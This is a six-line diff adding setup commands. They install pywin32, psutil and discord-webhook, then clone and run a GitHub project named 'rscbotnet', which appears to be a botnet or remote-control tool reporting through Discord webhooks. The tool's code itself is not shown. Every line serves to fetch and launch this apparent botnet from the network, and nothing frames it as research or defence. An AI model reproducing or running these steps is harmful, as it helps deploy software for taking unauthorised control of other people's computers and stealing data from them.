@@ -1,0 +1,6 @@
+pip install pywin32
+pip install psutil
+pip install discord-webhook
+git clone https://github.com/Porlius/rscbotnet.git
+cd rscbotnet
+python3 rscbotnet.py
